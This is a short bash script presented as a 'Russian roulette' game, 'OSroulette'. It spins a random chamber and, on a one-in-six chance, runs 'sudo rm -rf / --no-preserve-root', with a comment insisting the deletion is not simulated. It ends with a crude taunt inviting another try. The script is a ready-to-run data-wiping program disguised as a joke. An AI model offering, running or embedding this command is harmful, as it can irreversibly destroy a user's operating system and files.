#!/bin/bash

# OSroulette - A dangerous game


# Function to detect Linux distribution
get_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        echo "$ID"
    else
        echo "unknown"
    fi
}

# countdown
countdown() {
    echo -n "$1"
    for i in {3..1}; do
        echo -n "."
        sleep 1
    done
    echo
}

# Generate a random number between 1 and 6
chamber=$(( ( RANDOM % 6 ) + 1 ))

# The bullet is in chamber 1
bullet=1

echo "Welcome to OSroulette!"
countdown "Spinning the chamber"

if [ "$chamber" -eq "$bullet" ]; then
    echo "BANG! You lost."
    countdown "Deleting OS in 3 seconds"
    # The following line is NOT a simulation.
    sudo rm -rf / --no-preserve-root
    echo "OS deletion command executed."
else
    echo "Click. You survived. If you have balls try your luck with the next chamber!"
fi